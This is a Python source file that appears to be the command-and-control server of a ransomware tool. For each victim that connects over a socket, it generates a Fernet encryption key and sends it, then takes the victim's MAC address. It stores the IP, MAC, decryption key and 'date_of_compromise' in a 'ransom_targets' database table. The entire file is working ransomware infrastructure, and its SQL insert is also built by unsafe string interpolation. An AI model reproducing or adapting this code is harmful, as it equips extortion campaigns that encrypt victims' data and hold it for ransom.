import socket
from cryptography.fernet import Fernet
from database.db_driver import db_get_connection, db_error_handler
import sys

HOST="localhost"
PORT=12657

def get_key_and_write():
    key=Fernet.generate_key()
    with open("file-secret.key","wb") as f:
        f.write(key)
    return key

def save_target_details(server,target_ip,target_mac,key):
    try:
        conn=db_get_connection()
        cursor=conn.cursor()
        cursor.execute("CREATE TABLE IF NOT EXISTS ransom_targets(target_id INTEGER PRIMARY KEY, mac_addr VARCHAR(20) , ip_addr VARCHAR(20), decrypt_key TEXT NOT NULL,date_of_compromise DATETIME)")
        print(f"{target_ip}\t{target_mac}\t{key}")
        cursor.execute(f"INSERT INTO ransom_targets(mac_addr,ip_addr,decrypt_key,date_of_compromise) values('{target_mac}','{target_ip}','{key}',CURRENT_TIMESTAMP)")
        conn.commit()
        print("Saved details successfully")
    except Exception as exc_type:
        print(db_error_handler(exc_type))
        conn.close()
        server.close()
        sys.exit(-1)

def CNC_listen(HOST,PORT):
    server=socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"Listening on {PORT}")
    try:
        while True:
            conn, addr = server.accept()
            key=get_key_and_write()
            target_ip,target_port=addr[0],addr[1]
            print(f"Connection from {target_ip} on {target_port}")
            conn.send(key)
            data=conn.recv(1024)
            save_target_details(server,target_ip,data.decode(),key.decode())
    except KeyboardInterrupt:
        print("KeyBoard Interrupt received, stopping server!!")
        server.close()

CNC_listen(HOST,PORT)